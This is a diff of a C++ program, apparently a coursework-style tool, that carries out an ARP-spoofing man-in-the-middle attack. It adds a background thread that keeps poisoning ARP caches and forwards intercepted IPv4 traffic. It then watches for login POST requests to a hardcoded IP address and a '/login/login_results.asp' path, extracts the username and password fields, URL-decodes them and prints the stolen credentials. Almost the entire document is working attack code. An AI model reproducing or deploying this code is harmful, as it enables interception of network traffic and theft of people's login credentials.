@@ -1,44 +1,35 @@
 #include "Net.h"
+#include <cstdlib>
+#include <pthread.h>
+#include <unistd.h>
 
 using namespace std;
 
+void url_decode(char*);
+void* arp_spoofing(void*);
+string target_request = "POST /login/login_results.asp";
+uint8_t target_ip_arr[4] = {163, 182, 194, 25};
+Net* net;
+
 int main(int argc, char** argv){
-    Net* net = new Net((argc < 2) ? "" : argv[1]);
+    net = new Net((argc < 2) ? "" : argv[1]);
     net->get_net_mac();
     net->print_net_mac();
     net->arp_spoofing();
 
-    uint32_t target_ip = (163 << 24) + (182 << 16) + (194 << 8) + 25;
-    string target_request = "POST /login/login_results.asp";
+    pthread_t thread;
+    pthread_create(&thread, NULL, arp_spoofing, NULL); // Create a new thread to do ARP spoofing periodically
+
+    uint32_t target_ip = (target_ip_arr[0] << 24) + (target_ip_arr[1] << 16) + (target_ip_arr[2] << 8) + target_ip_arr[3];
 
     while (true) {
         tcp_packet buf;
         memset(&buf, 0, sizeof(buf));
-        int len = recvfrom(net->get_recv_sock(), &buf, ETH_FRAME_LEN, 0, NULL, NULL);
-        if (len > 0) {
-            if (ntohs(buf.eth_hdr.ether_type) == ETH_P_ARP && ntohs((Arp)buf.operation) == ARP_REQ) { // ARP request
-                // net->get_net_mac();
-                net->arp_spoofing();
-            }
-            else if (buf.ip_hdr.version == 0x4 && buf.ip_hdr.ihl == 0x5) { // IPv4
-                uint32_t ip_addr = ntohl(buf.ip_hdr.daddr);
-                if (ip_addr != net->get_ip()) {
-//cout << dec << (ip_addr >> 24) << "." << ((ip_addr >> 16) & 255) << "." << ((ip_addr >> 8) & 255) << "." << (ip_addr & 255) << endl;
-                    map<uint32_t, uint8_t*> *arp_table = net->get_arp_table();
-                    // Modify the destination MAC to the right value according to the destination IP
-                    if (arp_table->find(ip_addr) == arp_table->end()) memcpy(buf.eth_hdr.ether_dhost, (*arp_table)[net->get_gateway()], 6);
-                    else memcpy(buf.eth_hdr.ether_dhost, (*arp_table)[ip_addr], 6); // If the destination IP is not in the ARP table, send it to the default gateway
-                    memcpy(buf.eth_hdr.ether_shost, net->get_mac(), 6); // Modify the source MAC to the attacker's
-                    if (sendto(net->get_send_sock(), &buf, len, 0, (sockaddr*)net->get_arp_addr(), sizeof(*(net->get_arp_addr()))) < 0) {
-                        perror("sendto() failed");
-                        exit(EXIT_FAILURE);
-                    }
-                }
-            }
-        }
+        int len = recvfrom(net->get_forward_sock(), &buf, ETH_FRAME_LEN, 0, NULL, NULL);
+        if (len > 0) net->forward_ipv4(&buf, len);
         
         int payload_len;
-        if (ntohl(buf.ip_hdr.daddr) == target_ip && !strncpy(buf.data, target_request.c_str(), target_request.length())) { // Found the packet that contains username/password
+        if (ntohl(buf.ip_hdr.daddr) == target_ip && !strncmp(buf.data, target_request.c_str(), target_request.length()-5)) { // Found the packet that contains username/password        
             // Get the payload length
             for (int i = 0; ; i++) {
                 if (buf.data[i] == '\r' && buf.data[i+1] == '\n') {
@@ -46,10 +37,50 @@ int main(int argc, char** argv){
                 }
             }
             // Get username/password
-            char username[256], password[256];
-            if(sscanf(&buf.data[len - ETH_HDR_LEN - IPV4_HDR_LEN - TCP_HDR_LEN - payload_len], "txtUser=%s&txtPassword=%s", username, password)) 
-                cout << "Username: " << username << endl << "Password: " << password << endl;
+            char username[BUF_SIZE], password[BUF_SIZE];
+            if(sscanf(&buf.data[len - ETH_HDR_LEN - IPV4_HDR_LEN - TCP_HDR_LEN - payload_len], "txtUsername=%[^&]&txtPassword=%[^&]", username, password)) {
+                url_decode(username); url_decode(password);
+                cout << "Username: " << username << endl << "Password: " << password << endl << endl;
+            }
         }
     }
+
+    pthread_cancel(thread);
+    delete(net);
+
     return 0;
+}
+
+void* arp_spoofing(void* args) {
+    while (true) {
+        usleep(ARP_SPOOFING_PERIOD);
+        // net->get_net_mac(); // It cannot add ARP table entries from user space, so it has to detect whether there are new devices before do ARP spoofing
+        net->arp_spoofing();
+    }
+    return NULL;
+}
+
+unsigned char convert_hex(char c) {
+    unsigned char result;
+    if (c >= '0' && c <= '9') result = c - '0';
+    else if (c >= 'a' && c <= 'f') result = c - 'a' + 10;
+    else if (c >= 'A' && c <= 'F') result = c - 'A' + 10;
+    else {
+        perror("convert_hex() failed"); exit(EXIT_FAILURE);
+    }
+    return result;
+}
+
+void url_decode(char* str) {
+    string tmp;
+    for (int i = 0; str[i] != '\0'; i++) {
+        if (str[i] == '+') tmp += " ";
+        else if (str[i] == '%') {
+            unsigned char first = convert_hex(str[++i]);
+            unsigned char second = convert_hex(str[++i]);
+            tmp += ((first << 4) + second);
+        }
+        else tmp += str[i];
+    }
+    strcpy(str, tmp.c_str());
 }
